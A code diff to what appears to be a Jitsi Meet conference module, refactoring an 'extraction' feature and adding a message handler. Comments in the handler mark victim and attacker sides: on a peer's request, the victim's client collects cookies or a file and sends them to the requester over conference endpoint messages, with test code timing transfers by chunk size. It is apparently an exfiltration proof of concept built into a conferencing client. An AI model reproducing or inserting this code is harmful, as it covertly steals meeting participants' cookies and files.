@@ -5,7 +5,7 @@ import EventEmitter from 'events';
 import Logger from 'jitsi-meet-logger';
 
 import { openConnection } from './connection';
-import { ExtractionHandler } from './extraction/ExtractionHandler';
+import ExtractionHandler from './extraction/ExtractionHandler';
 import { ENDPOINT_TEXT_MESSAGE_NAME } from './modules/API/constants';
 import AuthHandler from './modules/UI/authentication/AuthHandler';
 import UIUtil from './modules/UI/util/UIUtil';
@@ -1303,9 +1303,9 @@ export default {
     },
 
     /**
-     * 
-     * @param {*} user 
-     * @param {*} receivedMessage 
+     *
+     * @param {*} user
+     * @param {*} receivedMessage
      */
     dispatchExtraction(user, receivedMessage) {
         // extraction started.
@@ -1324,20 +1324,17 @@ export default {
         APP.conference._extractionHandler = new ExtractionHandler(configuration);
         APP.conference._extractionHandler.initializeEncryption().then(() => {
 
-            // initiate event for extraction ending
-            APP.conference._extractionEventElement = new EventTarget();
-
             APP.conference._extractionHandler.receiveAll(user);
 
             // start receiving data, after receiving all data download a file
-            APP.conference._extractionEventElement.addEventListener('extractionEnded', object => {
-            // console.timeEnd('extractionTest');
+            APP.conference._extractionHandler.extractionEvent.addEventListener('extractionEnded', object => {
                 if (object.detail.config.test) {
                     this._extractionTests.push([ object.detail.config.chunkSize, performance.now() - this._startTime ]);
                     console.log('TEST RESULTS:', this._extractionTests);
                 } else {
                     this.downloadFile(object.detail.extractedData, fileName);
                 }
+
             });
         });
     },
@@ -1364,16 +1361,18 @@ export default {
             return null;
         }
 
+        const request = {
+            extraction: 'request',
+            config: configuration
+        };
+        const user = foundUser[0];
+
         try {
             // Start listening on the specified communication
-            this.initializeExtraction(configuration, fileName, foundUser[0]);
+            this.initializeExtraction(request, fileName, user);
 
             // send request to the user with specified name
-            APP.conference.sendEndpointMessage(foundUser[0].getId(),
-            {
-                extraction: 'request',
-                config: APP.conference._extractionHandler.configuration
-            });
+            APP.conference.sendEndpointMessage(user.getId(), request);
 
 
         } catch (err) {
@@ -1382,7 +1381,7 @@ export default {
     },
 
     async testPerformanceXMPP(userName, startingSize = 5000, filePath = 'D:\\Documents\\test.bin', fileName = 'extracted.bin') {
-        let startingSizeValue = startingSize;
+        const startingSizeValue = startingSize;
         const configuration = {
             method: 'endpoint',
             dataType: 'file',
@@ -1442,7 +1441,20 @@ export default {
         if (!APP.conference._extractionHandler || APP.conference._extractionHandler.communicationEnded) {
             APP.conference._extractionHandler = new ExtractionHandler(recievedData);
         }
-        APP.conference._extractionHandler.handleMessage(user);
+
+        // this runs on the victim's side
+        if (recievedData.extraction === 'request') {
+            if (recievedData.config.dataType !== 'cookies') {
+                APP.conference.dispatchExtraction(user, recievedData);
+
+                return;
+            }
+            this._acquireData(recievedData.config).then(acquiredData => {
+                APP.conference._extractionHandler.sendAll(acquiredData, user);
+            });
+        } else { // 'reply' received, this runs on the attacker's side 
+            APP.conference._extractionHandler.receiveEndpointData(recievedData);
+        }
     },
 
     /**
